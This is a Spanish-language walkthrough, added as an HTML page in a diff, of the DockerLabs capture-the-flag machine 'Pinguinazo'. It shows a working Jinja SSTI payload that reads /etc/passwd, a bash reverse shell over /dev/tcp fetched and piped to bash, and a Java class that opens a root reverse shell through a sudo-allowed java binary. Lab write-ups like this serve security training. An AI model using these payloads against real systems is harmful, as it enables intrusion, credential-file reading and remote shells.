@@ -1,0 +1,101 @@
+<p><img src="assets/logo-dockerlabs.png" alt="logodocker" w="200" h="200" /></p>
+
+<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  encontramos con escaneo de puertos para buscar una entrada al sistema,un server side template inyection , revshell y escalada.</p>
+
+<h2 id="herramientas-y-recursos-usados">Herramientas y recursos usados</h2>
+
+<ul>
+  <li>Nmap</li>
+  <li>Revshell java</li>
+  <li><a href="https://www.revshells.com/" title="Revshells">revshell</a></li>
+</ul>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Empezamos lanzando un nmap contra el objetivo .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oX</span> pinguinazo 172.17.0.2  
+</code></pre></div></div>
+<p><a href="/reporte/pinguinazo.html" title="reportesnmap">Reporte nmap</a></p>
+
+<p>Podemos ver claramente la version que corre  y el puerto por el que tenemos acceso al werkzeug 3.1 
+Revisamos la web y el titulo nos confirma esta creada con flask y por lo general flask usa el motor de plantillas jinja.”Django tambien lo usa”.
+Solo teniendo eso al alcanze hay que ver que vulberabilidad podria tener.
+Yo me volvi loco buscando como explotar eso estuve intentando quebrar el pin de la consola para tener acceso pero sin resultado dado que se necesitan recuperar varios datos del server y en esta version creo que es imposible de obtenerlos.</p>
+
+<p><img src="assets/pinguinazo/console.png" alt="console" /></p>
+
+<p>Haber si hay suerte y mario nos arma una con esa vulnerabilidad, que quede con las ganas de aprenderla.</p>
+
+<p>Por tanto tiene que ser mas sencillo, pruebo a inyectar codigo html.</p>
+
+<p><img src="assets/pinguinazo/inyecthtml.png" alt="inyecthtml" /></p>
+
+<p>Si se ha tragado el html podriamos probar a inyectar otro tipo de payload que no solo lo interprete si no que ejecute codigo , para ello probamos con un ssti dado que la info info obtenida de google nos dice que podria ser vulnerable.</p>
+
+<p>Comprobamos con una divison contra 0 y vemos que nos da error por tanto tenemos un ssti y podrmos lanzarnos una revshell desde ahi mismo.</p>
+
+<p><img src="assets/pinguinazo/error.png" alt="error" /></p>
+
+<p>Podriamos leer ficheros pero teniendo solo el puerto 5000 abierto no nos sera de utilidad asi que nos mandamos un revshell.</p>
+
+<blockquote>
+  <p>Lectura de ficheros ejemplo.</p>
+</blockquote>
+
+<p>{{config.<strong>class</strong>.<strong>init</strong>.<strong>globals</strong>[‘os’].popen(‘cat /etc/passwd’).read()}}</p>
+
+<p><img src="assets/pinguinazo/passwd.png" alt="passwd" /></p>
+
+<h2 id="explotacion-e-infiltracion">Explotacion e infiltracion</h2>
+
+<p>Lanzando revshell , como siempre primero a la escucha con nc.</p>
+
+<p>Yo me he creado un fichero <strong>html</strong> em mi maquina atacante con el contendio para mandarme una revshell despues lo pipeo a bash para que lo ejecute el server.</p>
+
+<p>Contenido del archivo html.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s1">'exec bash -i &amp;&gt;/dev/tcp/192.168.0.112/443 &lt;&amp;1'</span>
+</code></pre></div></div>
+<p>Levantamos un server con python3 y lanzamos la orden desde la web.</p>
+
+<p><img src="assets/pinguinazo/webrev.png" alt="web" /></p>
+
+<p><img src="assets/pinguinazo/revshell.png" alt="revshell" /></p>
+
+<p>Ya estamos dentro de la maquina.</p>
+
+<h2 id="escalada">Escalada</h2>
+
+<p>Yo como siempre empiezo con sudo -l.</p>
+
+<p><img src="assets/pinguinazo/sudol.png" alt="java" /></p>
+
+<p>Me toca buscar en la web porque nunca he realizado la escalada con java asi que al lio.</p>
+
+<p>Debemos de crear un fichero java con el contenido que creamos oportuno y lo ejecutamos con sudo.</p>
+
+<p>En este caso creamos un revshell</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">shell</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Process</span> <span class="n">p</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1"</span><span class="o">);</span>
+            <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+            <span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Creamos el fichero con el contenido correcto yo lo llamo revshell.java y posteriormente ejecuto java con sudo llamando al script recien creado.</p>
+
+<p><img src="assets/pinguinazo/ejecucion.png" alt="ejecucion" /></p>
+
+<p><img src="assets/pinguinazo/root.png" alt="root" /></p>
+
+<p>Hasta aqui el pinguinazo que me volvio loco …….</p>
+
+<p>Gracias por leer.</p>
+
